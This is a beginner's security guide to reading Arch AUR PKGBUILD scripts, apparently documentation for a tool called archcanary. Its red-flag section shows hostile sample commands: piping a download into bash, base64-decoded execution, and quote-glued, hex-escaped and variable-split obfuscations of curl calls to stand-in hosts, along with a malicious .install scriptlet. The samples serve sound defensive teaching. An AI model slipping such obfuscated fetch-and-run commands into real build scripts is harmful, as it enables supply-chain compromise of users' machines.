# Reading a PKGBUILD (for people who've never done it)

You don't need to be a programmer to read a PKGBUILD safely. This page assumes
you've never opened one before and walks through everything from scratch — what
it is, what a normal one looks like, and what real attacks have actually looked
like when they hid inside one.

If you only read one section, read [§3, the red flags](#3-red-flags--real-techniques-from-real-attacks) — but the rest gives you the context to actually recognize them.

## 1. What a PKGBUILD actually is

A PKGBUILD is not a settings file, a manifest, or a list of instructions someone
else follows for you. **It's a Bash shell script.** When you install something
from the AUR — `yay -S somepackage`, `paru -S somepackage`, or running
`makepkg` by hand — that script's code actually *runs* on your computer, under
your own user account.

This is the single most important difference between the AUR and Arch's
official repositories. A package from the official repos is a pre-built binary
that Arch's own trusted maintainers reviewed, built, and signed. A PKGBUILD
from the AUR is a *recipe anyone can upload* — and the recipe itself is
executable code, not a description of what should happen.

Concretely: if a line in a PKGBUILD deletes your files, reads your SSH keys, or
downloads and runs a virus, that line just executes. Nothing built into Arch
stops it. Reviewing the script *before* it runs is the only thing standing
between you and whatever it contains.

## 2. Anatomy of a PKGBUILD

Here's a small, realistic, entirely normal PKGBUILD:

```bash
pkgname=hello-world
pkgver=1.0.0
pkgrel=1
pkgdesc="A simple hello world program"
arch=('x86_64')
url="https://github.com/example/hello-world"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/hello-world/archive/v$pkgver.tar.gz")
sha256sums=('a1b2c3d4...')

build() {
  cd "$pkgname-$pkgver"
  make
}

package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
```

Walking through it:

- **`pkgname`, `pkgver`, `pkgrel`, `pkgdesc`, `arch`, `url`, `license`** — plain
  metadata. Name, version, a description, what CPU architecture it's built
  for, a homepage link, the license. None of this runs anything; it's just
  labels.
- **`source=(...)`** — this is the important one: it says *where the actual
  program's source code comes from*. A legitimate package points this at the
  real upstream project — its GitHub/GitLab page, its own website, or its
  official release archive. If this points somewhere unrelated to the program
  itself (a random file-sharing link, a paste service, someone's personal,
  unrelated-looking repo), that's already worth pausing on.
- **`sha256sums=(...)`** — a fingerprint of the file `source=()` downloads.
  `makepkg` checks the downloaded file against this before doing anything with
  it, so a tampered-in-transit download gets caught. If this is set to `SKIP`
  with no clear reason (some genuinely can't be checksummed, like a `-git`
  package that always pulls the latest commit), that safety check is
  disabled — worth knowing, not automatically a red flag, but worth noticing.
- **`build()`** — compiles the program. This usually mirrors the same build
  steps the upstream project's own README would tell you to run by hand.
- **`package()`** — copies the *finished*, already-built files into the
  correct system locations (into `$pkgdir`, a fake root that `makepkg` later
  turns into the actual installed package). This is the "installation" step.

Two more you'll see on more complex packages:

- **`prepare()`** — runs *before* `build()`, typically to apply patches or set
  something up. Same rules apply: read it like you'd read `build()`.
- **A separate `<pkgname>.install` file** — covered in §3, since it's exactly
  the kind of thing attackers have actually abused.

That's the whole shape. Everything else you'll see in a PKGBUILD is a variation
on these same pieces.

## 3. Red flags — real techniques from real attacks

Every example below is a real technique used in a real, documented AUR
incident — not a hypothetical. `archcanary`'s own `--check-pkgbuild` scanner
was built to catch exactly these, because they kept showing up.

### Downloading and immediately running a script

```bash
curl -s https://example.com/setup.sh | bash
```

You have *no idea* what that script contains, and it runs the instant it
downloads — no review, no matter how convincing the surrounding code looks. A
legitimate PKGBUILD never needs this: `source=()` already handles downloading,
with a checksum check, and `build()` compiles what was downloaded. There's no
legitimate packaging reason to pipe a download straight into a shell.

### Disguised commands

This is the one most worth slowing down for, because it's designed to not
look like anything at a glance. From the real June 2026 AUR supply-chain
attack:

```bash
'b''u''n' 'a'"d""d" 'j''s'"-""d""i""g""e""s""t"
```

That looks like nonsense. It isn't — in Bash, quoted strings sitting directly
next to each other with no space between them just glue together. `'b''u''n'`
becomes `bun`. The whole line, read by the shell, is actually:

```bash
bun add js-digest
```

— silently installing a malicious npm package, written in a way specifically
meant to slip past a quick read *and* a naive text search for the word "bun".

Other disguises that show up in real attacks, all with the same goal (stop you
or a scanner from immediately recognizing the command):

- **Base64 encoding:** `echo 'aGVsbG8=' | base64 -d | bash` — you can't tell
  what runs without decoding it yourself first.
- **Hex-escaped, byte-by-byte spelling:** `$'\x63\x75\x72\x6c'` is the letters
  c-u-r-l, one byte at a time, reassembled by Bash at run time.
- **Variable-split reassembly:** `a=cu; b=rl; $a$b -s https://evil.example`
  builds the word `curl` out of two harmless-looking variables.

None of these have a legitimate packaging use. If you see a command that's
gone out of its way to *not* just say what it is, that's the tell — not the
specific encoding trick used.

### Unexpected or unrelated new dependencies

The `bun add js-digest` example above *is* this category — a text-editor-style
package has no reason to be installing an unrelated npm package as a build
step. If a PKGBUILD suddenly depends on something that has nothing to do with
what the program actually does (especially anything networking- or
credential-adjacent), ask why.

### The `.install` file

A package can ship a separate `<pkgname>.install` file with functions like
`post_install()` and `post_upgrade()`. These run automatically and silently
every time you install or upgrade the package — no separate confirmation step,
and it's easy to forget to check since it's not the file most review habits
default to.

A real 2025 incident used exactly this: a fake `google-chrome-stable` AUR
package shipped an `.install` scriptlet that ran a Python command to download
and execute malware *every single time Chrome launched* — not at build time at
all, so a review habit that only reads `build()`/`package()` would miss it
entirely. It was still caught fast in practice (reported and removed within
hours) — but that came from someone noticing odd behavior *after* installing
it and reporting it on Reddit, not from anyone reading the `.install` file
first. The point isn't that this technique is slow to get caught; it's that
catching it this way depends on someone else noticing after the fact, which
isn't something you want to rely on for your own system.

**If a package ships an `.install` file, read it with the same scrutiny as
`build()`.** It's not an afterthought.

## 4. What a normal update actually looks like

When your AUR helper shows you a diff before an update, a normal, healthy
update usually touches *only*:

- `pkgver` (and `pkgrel`, if the packaging itself changed without a new
  upstream version)
- `sha256sums` (a new version means a new file, means a new checksum — this
  changing alongside `pkgver` is expected, not suspicious on its own)
- occasionally `depends`/`makedepends`, but this should be rare and should
  correspond to something you could independently verify in the upstream
  project's own changelog (e.g. "now requires libfoo ≥ 2.0")

If instead you see `build()`/`package()`/`prepare()` themselves rewritten, a
new `curl`/`wget` line that wasn't there before, the `source=()` URL pointing
somewhere completely different, or a diff that's just *much* bigger than "bump
a version number" would explain — stop and actually read what changed before
approving it. This is exactly the moment most real attacks count on you
clicking through without looking.

## 5. When to stop reading and ask for help

You don't need to become a Bash expert to use the AUR safely. If something
looks off and you can't tell whether it's fine:

- Check the AUR comments section for that package first — if something's
  wrong, someone else has often already asked.
- Ask in the Arch forums or your distro's community channels. Post the
  specific line you're unsure about.
- When in doubt, don't build it yet. A package sitting unbuilt for a day while
  you ask costs you nothing; running something malicious does.

And this is exactly where `archcanary` fits in — not as a replacement for
knowing what to look for, but as a backstop for the moments you don't have
time to look, or the obfuscation is good enough that a quick read misses it.
`archcanary --check-pkgbuild` scans for the exact patterns in §3 automatically,
and if you use yay or paru, archcanary's pre-build hooks (see
[my-setup.md](my-setup.md)) run this same check on *every* AUR build before it
compiles anything, aborting automatically on a match. Know what to look for —
and have something watching for the times you don't.
